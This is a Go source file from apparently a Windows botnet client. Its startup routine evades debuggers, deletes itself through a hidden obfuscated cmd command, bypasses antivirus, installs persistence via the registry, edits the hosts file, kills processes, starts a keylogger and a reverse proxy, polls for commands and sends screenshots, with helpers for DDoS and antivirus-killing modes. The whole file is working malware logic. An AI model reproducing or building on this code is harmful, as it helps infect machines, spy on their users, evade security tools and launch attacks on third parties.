package components

import (
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

//============================================================
//                   Load Bot Settings
//============================================================

// LoadConfig is the starting point for the bots
func LoadConfig() {

	if singleInstance != false {
		ist := checkSingleInstance(instanceKey)
		if ist != false && strings.Contains(os.Args[0], watchdogName+".exe") { //Make me a WatchDog.
			if antiDebug != false {
				if detect() != false { //Oh hell no!
					if debugReaction == 0 {
						goodbye := exec.Command("cmd", "/Q", "/C", deobfuscate("qjoh!2/2/2/2!.o!2!.x!5111!?!Ovm!'!Efm!")+os.Args[0]) // ping 1.1.1.1 -n 1 -w 4000 > Nul & Del
						goodbye.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
						goodbye.Start()
						os.Exit(-1)
					} else if debugReaction == 1 {
						os.Exit(-1)
					} else if debugReaction == 2 {
						for {
							time.Sleep(250 * time.Millisecond)
						}
					}
				}
			}
			loadInfo() //Load IP, GUID and Admin State

			isinstalled, val1, val2 := scanReg()
			if isinstalled {
				myInstallReg = val1
				myName = val2
			} else {
				os.Exit(-1)
			}
			time.Sleep(5 * time.Second)
			watchDog() //Guard ME loop
			//NEVER GETS HERE or BELLOW.
		} else {
			//HELP DETECTION BLOCK
			if sleepOnRun != false {
				goToSleep(sleepOnRunTime)
			}

			if antiDebug != false {
				if detect() != false { //Oh hell no!
					if debugReaction == 0 {
						goodbye := exec.Command("cmd", "/Q", "/C", deobfuscate("qjoh!2/2/2/2!.o!2!.x!5111!?!Ovm!'!Efm!")+os.Args[0])
						goodbye.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
						goodbye.Start()
						os.Exit(-1)
					} else if debugReaction == 1 {
						os.Exit(-1)
					} else if debugReaction == 2 {
						for {
							time.Sleep(250 * time.Millisecond)
						}
					}
				}
			}

			if antiVirusBypass != false {
				bypassAV()
			}

			loadInfo() //Load IP, GUID and Admin State

			isinstalled, val1, val2 := scanReg()
			if isinstalled {
				myInstallReg = val1
				myName = val2
			} else {
				if startUpError != false {
					messageBox(startUpErrorTitle, startUpErrorText, MBIconError)
				}

				if installMe != false {
					install()
				}

				if editHosts != false {
					editHost(hostlist, false)
				}
			}

			// takeAMoment() //Delay helps detection

			if activeDefense != false && installMe != false {
				go runActiveDefense()
			}

			if antiProcess != false {
				setAnitProc(true)
				go antiProc()
			}

			// takeAMoment() //Delay helps detection

			if autoKeylogger != false {
				setKeyLoggerMode(true)
				startLogger(0)
			}

			if autoReverseProxy != false {
				proxSrvLoad(reverseProxyPort, reverseProxyBackend)
			}
			// takeAMoment() //Delay helps detection
			//REMOVE AFTER TESTING
			myUID = "492cf494-8ba8-42d8-9852-f926ad50d618"
			go checkCommand()
			go sendScreenshot()
		}
	}
}

func scanReg() (isinstalled bool, dat string, data string) { //See if i am already install, if so, gather information
	for i := 0; i < len(registryNames); i++ { //lets figure out if we are already installed in the system and what we are installed as....
		val, err := getRegistryKeyValue(registry.CURRENT_USER, "Software\\"+registryNames[i]+"\\", "NAME")
		if err != nil {
		} else { //Found ME, Saving my name to memory
			return true, registryNames[i], deobfuscate(val)
		}
	}
	return false, "", ""
}

//============================================================
//                   Handle Bot Modes
//============================================================

func setDDoSMode(mode bool) {
	isDDoS = mode
}

func setKeyLoggerMode(mode bool) {
	isKeyLogging = mode
}

func setAdmin(is bool) {
	isAdmin = is
}

func checkisAdmin() string {
	if isAdmin {
		return "Yes"
	}
	return "No"
}

func setAVKilling(is bool) {
	isAVKilling = is
}

func setAnitProc(is bool) {
	isAntiProc = is
}
